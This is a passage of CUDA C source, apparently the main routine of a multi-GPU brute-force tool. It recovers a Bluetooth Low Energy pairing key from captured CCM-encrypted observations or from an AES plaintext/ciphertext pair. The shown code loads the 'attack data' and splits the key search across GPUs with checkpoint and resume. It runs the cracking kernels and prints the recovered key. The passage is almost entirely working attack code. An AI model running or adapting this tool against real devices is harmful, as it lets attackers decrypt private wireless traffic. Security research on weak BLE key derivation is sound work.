    for (int obs = 0; obs < d.obs_count; ++obs) {
      size_t byteBase = obs * BLE_V3_OBS_SIZE;
      size_t wordBase = obs * BLE_V3_OBS_WORDS;
      for (int word = 0; word < BLE_V3_OBS_WORDS; ++word) {
        bleObs[wordBase + word] =
            pack_be_u32(&d.ble_obs_words[byteBase + word * 4]);
      }
    }
  } else {
    printf("Error: unknown attack-data mode %u\n", d.mode);
    return 1;
  }

  int startByte = 16 - d.key_size;
  int numBytes = d.key_size;

  KeyPlan plan;
  prepareKeyPlan(&plan, startByte, numBytes);

  printf("\n");
  printf("Attack Mode:          %s\n", d.mode == ATTACK_MODE_BLE_CCM
                                           ? "BLE CCM authenticated"
                                           : "fast AES block");
  printHex("Pairing Key (base):   ", baseKey, 4);
  printHex("SKD:                  ", derivationNonce, 4);
  if (d.mode == ATTACK_MODE_FAST) {
    printf("Payload Length:       %u byte(s)\n", d.payload_len);
    printHex("Plaintext:            ", plaintext, 4);
    printHex("Target Ciphertext:    ", targetCiphertext, 4);
    printHex("Compare Mask:         ", compareMask, 4);
  } else {
    printf("Observations:         %u\n", d.obs_count);
    for (int obs = 0; obs < d.obs_count; ++obs) {
      printf("  Observation %d payload length: %u byte(s)\n", obs + 1,
             bleObs[obs * BLE_V3_OBS_WORDS] >> 24);
    }
  }
  printf("\n");

  // Initialize GPUs
  int deviceCount = 0;
  cudaError_t deviceCountError = cudaGetDeviceCount(&deviceCount);
  if (deviceCountError != cudaSuccess) {
    fprintf(stderr, "CUDA initialization failed: %s\n",
            cudaGetErrorString(deviceCountError));
    return 1;
  }
  if (deviceCount == 0) {
    fprintf(stderr, "No CUDA-capable GPU detected.\n");
    return 1;
  }

  if (numGpusArg > deviceCount) {
    printf("Warning: Requested %d GPUs, but only %d available. Using %d.\n",
           numGpusArg, deviceCount, deviceCount);
    numGpusArg = deviceCount;
  } else {
    if (numGpusArg <= 0) numGpusArg = 1;
    printf("Using %d GPU(s)\n", numGpusArg);
  }

  u64 totalCombinations = 1ULL << (numBytes * 8);

  GpuContext* contexts = (GpuContext*)malloc(sizeof(GpuContext) * numGpusArg);
  if (!contexts) {
    printf("Failed to allocate GPU contexts\n");
    return 1;
  }

  u64 rangePerGpu = (totalCombinations + numGpusArg - 1) / numGpusArg;
  int found = 0;

  // Initialize each GPU
  for (int i = 0; i < numGpusArg; i++) {
    contexts[i].deviceId = i;
    gpuErrorCheck(cudaSetDevice(i));
    gpuErrorCheck(cudaStreamCreate(&contexts[i].stream));

    contexts[i].rangeStart = i * rangePerGpu;
    u64 end = (i + 1) * rangePerGpu;
    contexts[i].rangeEnd = (end > totalCombinations) ? totalCombinations : end;
    contexts[i].currentIdx = contexts[i].rangeStart;
    contexts[i].keysProcessed = 0;

    // Allocate device memory
    gpuErrorCheck(cudaMalloc(&contexts[i].d_baseKey, 4 * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_derivationNonce, 4 * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_plaintext, 4 * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_targetCiphertext, 4 * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_compareMask, 4 * sizeof(u32)));
    gpuErrorCheck(
        cudaMalloc(&contexts[i].d_bleObs,
                   MAX_BLE_OBSERVATIONS * BLE_V3_OBS_WORDS * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_foundKey, 4 * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_found, sizeof(int)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_t0, TABLE_SIZE * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_t4_0, TABLE_SIZE * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_t4_1, TABLE_SIZE * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_t4_2, TABLE_SIZE * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_t4_3, TABLE_SIZE * sizeof(u32)));
    gpuErrorCheck(cudaMalloc(&contexts[i].d_rcon, RCON_SIZE * sizeof(u32)));

    // Copy constant data
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_baseKey, baseKey,
                                  4 * sizeof(u32), cudaMemcpyHostToDevice,
                                  contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_derivationNonce,
                                  derivationNonce, 4 * sizeof(u32),
                                  cudaMemcpyHostToDevice, contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_plaintext, plaintext,
                                  4 * sizeof(u32), cudaMemcpyHostToDevice,
                                  contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_targetCiphertext,
                                  targetCiphertext, 4 * sizeof(u32),
                                  cudaMemcpyHostToDevice, contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_compareMask, compareMask,
                                  4 * sizeof(u32), cudaMemcpyHostToDevice,
                                  contexts[i].stream));
    gpuErrorCheck(
        cudaMemcpyAsync(contexts[i].d_bleObs, bleObs,
                        MAX_BLE_OBSERVATIONS * BLE_V3_OBS_WORDS * sizeof(u32),
                        cudaMemcpyHostToDevice, contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_t0, T0,
                                  TABLE_SIZE * sizeof(u32),
                                  cudaMemcpyHostToDevice, contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_t4_0, T4_0,
                                  TABLE_SIZE * sizeof(u32),
                                  cudaMemcpyHostToDevice, contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_t4_1, T4_1,
                                  TABLE_SIZE * sizeof(u32),
                                  cudaMemcpyHostToDevice, contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_t4_2, T4_2,
                                  TABLE_SIZE * sizeof(u32),
                                  cudaMemcpyHostToDevice, contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_t4_3, T4_3,
                                  TABLE_SIZE * sizeof(u32),
                                  cudaMemcpyHostToDevice, contexts[i].stream));
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_rcon, RCON32,
                                  RCON_SIZE * sizeof(u32),
                                  cudaMemcpyHostToDevice, contexts[i].stream));

    int foundInit = 0;
    gpuErrorCheck(cudaMemcpyAsync(contexts[i].d_found, &foundInit, sizeof(int),
                                  cudaMemcpyHostToDevice, contexts[i].stream));

    // Determine optimal block size
    int minGridSize;
    if (d.mode == ATTACK_MODE_BLE_CCM) {
      gpuErrorCheck(cudaOccupancyMaxPotentialBlockSize(
          &minGridSize, &contexts[i].threadsPerBlock, bruteforceKernelBleCcm, 0,
          0));
    } else {
      gpuErrorCheck(cudaOccupancyMaxPotentialBlockSize(
          &minGridSize, &contexts[i].threadsPerBlock, bruteforceKernelFast, 0,
          0));
    }

    cudaDeviceProp deviceProp;
    gpuErrorCheck(cudaGetDeviceProperties(&deviceProp, i));
    contexts[i].maxGridSizeX = deviceProp.maxGridSize[0];
    printf("GPU %d: %s (%d MPs, %d threads/block, maxGrid.x=%d)\n", i,
           deviceProp.name, deviceProp.multiProcessorCount,
           contexts[i].threadsPerBlock, contexts[i].maxGridSizeX);
  }
  printf("\n");

  // Register signal handler
  signal(SIGINT, sigint_handler);

  // Checkpoint/resume logic
  u32 jobHash =
      compute_job_hash(d.mode, d.obs_count, baseKey, derivationNonce, plaintext,
                       targetCiphertext, compareMask, bleObs);
  char checkpointPath[256];
  get_checkpoint_path(checkpointPath, jobHash);

  double elapsedMs = 0.0;
  u64* checkpointIndices = (u64*)malloc(sizeof(u64) * numGpusArg);
  int fileNumGpus = 0;
  u64 resumePoint = 0;

  if (access(checkpointPath, F_OK) == 0) {
    if (load_checkpoint(checkpointPath, jobHash, checkpointIndices, numGpusArg,
                        totalCombinations, &elapsedMs, &fileNumGpus)) {
      resumePoint = checkpointIndices[0];

      // Redistribute remaining work from resumePoint
      u64 remaining = totalCombinations - resumePoint;
      u64 rangePerGpu = (remaining + numGpusArg - 1) / numGpusArg;

      for (int i = 0; i < numGpusArg; i++) {
        contexts[i].rangeStart = resumePoint + i * rangePerGpu;
        u64 end = resumePoint + (i + 1) * rangePerGpu;
        contexts[i].rangeEnd =
            (end > totalCombinations) ? totalCombinations : end;
        contexts[i].currentIdx = contexts[i].rangeStart;
        contexts[i].keysProcessed = 0;
      }

    } else {
      elapsedMs = 0.0;
    }
  }

  free(checkpointIndices);

  // Main execution loop
  struct timespec startTime, endTime;
  clock_gettime(CLOCK_MONOTONIC, &startTime);
  struct timespec sessionStartTime = startTime;

  // Adjust start time for previously elapsed time
  startTime.tv_sec -= (time_t)(elapsedMs / 1000.0);
  startTime.tv_nsec -=
      (long)((elapsedMs - ((time_t)(elapsedMs / 1000.0) * 1000.0)) * 1e6);
  if (startTime.tv_nsec < 0) {
    startTime.tv_sec--;
    startTime.tv_nsec += 1000000000L;
  }

  time_t lastCheckpointTime = time(NULL);
  bool allDone = false;

  while (!allDone) {
    allDone = true;

    // Launch batches on all GPUs
    for (int i = 0; i < numGpusArg; i++) {
      if (contexts[i].currentIdx < contexts[i].rangeEnd) {
        allDone = false;

        u64 remaining = contexts[i].rangeEnd - contexts[i].currentIdx;
        u64 maxBlocks = 65535;
        u64 batchSize =
            maxBlocks * contexts[i].threadsPerBlock * KEYS_PER_THREAD;
        if (batchSize > remaining) batchSize = remaining;

        gpuErrorCheck(cudaSetDevice(i));

        dim3 gridDim;
        u64 threadsNeeded = (batchSize + KEYS_PER_THREAD_MIN) / KEYS_PER_THREAD;
        u64 batchBlocks = (threadsNeeded + contexts[i].threadsPerBlock - 1) /
                          contexts[i].threadsPerBlock;

        if (batchBlocks > 65535) {
          gridDim.x = 65535;
          gridDim.y = (batchBlocks + 65535 - 1) / 65535;
        } else {
          gridDim.x = batchBlocks;
          gridDim.y = 1;
        }

        if (d.mode == ATTACK_MODE_BLE_CCM) {
          bruteforceKernelBleCcm<<<gridDim, contexts[i].threadsPerBlock, 0,
                                   contexts[i].stream>>>(
              contexts[i].d_baseKey, plan, contexts[i].d_derivationNonce,
              contexts[i].d_bleObs, d.obs_count, contexts[i].d_foundKey,
              contexts[i].d_found, contexts[i].currentIdx, batchSize,
              contexts[i].d_t0, contexts[i].d_t4_0, contexts[i].d_t4_1,
              contexts[i].d_t4_2, contexts[i].d_t4_3, contexts[i].d_rcon);
        } else {
          bruteforceKernelFast<<<gridDim, contexts[i].threadsPerBlock, 0,
                                 contexts[i].stream>>>(
              contexts[i].d_baseKey, plan, contexts[i].d_derivationNonce,
              contexts[i].d_plaintext, contexts[i].d_targetCiphertext,
              contexts[i].d_compareMask, contexts[i].d_foundKey,
              contexts[i].d_found, contexts[i].currentIdx, batchSize,
              contexts[i].d_t0, contexts[i].d_t4_0, contexts[i].d_t4_1,
              contexts[i].d_t4_2, contexts[i].d_t4_3, contexts[i].d_rcon);
        }

        contexts[i].currentIdx += batchSize;
        contexts[i].keysProcessed += batchSize;
      }
    }

    // Synchronize and check status
    u64 totalProcessed = 0;
    for (int i = 0; i < numGpusArg; i++) {
      gpuErrorCheck(cudaSetDevice(i));

      int devFound = 0;
      gpuErrorCheck(cudaMemcpyAsync(&devFound, contexts[i].d_found, sizeof(int),
                                    cudaMemcpyDeviceToHost,
                                    contexts[i].stream));
      gpuErrorCheck(cudaStreamSynchronize(contexts[i].stream));

      if (devFound) {
        found = 1;
      }
      totalProcessed += contexts[i].keysProcessed;
    }

    time_t now = time(NULL);

    // Periodic checkpoint save (every 60 seconds)
    if (now - lastCheckpointTime >= 60) {
      clock_gettime(CLOCK_MONOTONIC, &endTime);
      double currentElapsedMs =
          (endTime.tv_sec - startTime.tv_sec) * 1000.0 +
          (endTime.tv_nsec - startTime.tv_nsec) / 1000000.0;
      if (save_checkpoint(checkpointPath, jobHash, contexts, numGpusArg,
                          totalCombinations, currentElapsedMs)) {
        lastCheckpointTime = now;
      }
    }

    // Check for interrupt
    if (interrupted) {
      clock_gettime(CLOCK_MONOTONIC, &endTime);
      double currentElapsedMs =
          (endTime.tv_sec - startTime.tv_sec) * 1000.0 +
          (endTime.tv_nsec - startTime.tv_nsec) / 1000000.0;
      save_checkpoint(checkpointPath, jobHash, contexts, numGpusArg,
                      totalCombinations, currentElapsedMs);
      break;
    }
  }

  clock_gettime(CLOCK_MONOTONIC, &endTime);

  double totalElapsedSeconds = (endTime.tv_sec - startTime.tv_sec) +
                               (endTime.tv_nsec - startTime.tv_nsec) / 1e9;
  double sessionElapsedSeconds =
      (endTime.tv_sec - sessionStartTime.tv_sec) +
      (endTime.tv_nsec - sessionStartTime.tv_nsec) / 1e9;

  printf("\n\n");

  if (found) {
    u32 foundKey[4];
    for (int i = 0; i < numGpusArg; i++) {
      gpuErrorCheck(cudaSetDevice(i));
      int f = 0;
      cudaMemcpy(&f, contexts[i].d_found, sizeof(int), cudaMemcpyDeviceToHost);
      if (f) {
        gpuErrorCheck(cudaMemcpy(foundKey, contexts[i].d_foundKey,
                                 4 * sizeof(u32), cudaMemcpyDeviceToHost));
        break;
      }
    }
    printf("========================================\n");
    printHex("✓ KEY FOUND: ", foundKey, 4);
    remove(checkpointPath);
  } else if (!interrupted) {
    printf("========================================\n");
    printf("✗ Key not found in search space\n");
    remove(checkpointPath);
  } else {
    printf("========================================\n");
  }

  u64 totalProcessed = 0;
  for (int i = 0; i < numGpusArg; i++)
    totalProcessed += contexts[i].keysProcessed;

  u64 totalProcessedIncludingResume = resumePoint + totalProcessed;

  double keysPerSecond = (double)totalProcessed / sessionElapsedSeconds;
  char speedStr[64];
  format_speed(speedStr, sizeof(speedStr), keysPerSecond);

  printf("========================================\n");
  if (resumePoint > 0) {
    printf("Session time: %.2f seconds\n", sessionElapsedSeconds);
    printf("Total time (including resume): %.2f seconds\n",
           totalElapsedSeconds);
  } else {
    printf("Time: %.2f seconds\n", sessionElapsedSeconds);
  }
  printf("Keys processed this session: %llu\n", totalProcessed);
  if (resumePoint > 0) {
    printf("Total keys processed: %llu (%.2f%%)\n",
           totalProcessedIncludingResume,
           (totalProcessedIncludingResume * 100.0) / totalCombinations);
  }
  printf("Average speed: %s\n", speedStr);
  printf("========================================\n");

  // Cleanup
  for (int i = 0; i < numGpusArg; i++) {
    gpuErrorCheck(cudaSetDevice(i));
    cudaFree(contexts[i].d_baseKey);
    cudaFree(contexts[i].d_derivationNonce);
    cudaFree(contexts[i].d_plaintext);
    cudaFree(contexts[i].d_targetCiphertext);
    cudaFree(contexts[i].d_compareMask);
    cudaFree(contexts[i].d_bleObs);
    cudaFree(contexts[i].d_foundKey);
    cudaFree(contexts[i].d_found);
    cudaFree(contexts[i].d_t0);
    cudaFree(contexts[i].d_t4_0);
    cudaFree(contexts[i].d_t4_1);
    cudaFree(contexts[i].d_t4_2);
    cudaFree(contexts[i].d_t4_3);
    cudaFree(contexts[i].d_rcon);
    cudaStreamDestroy(contexts[i].stream);
  }
  free(contexts);

  return found ? 0 : 1;
}
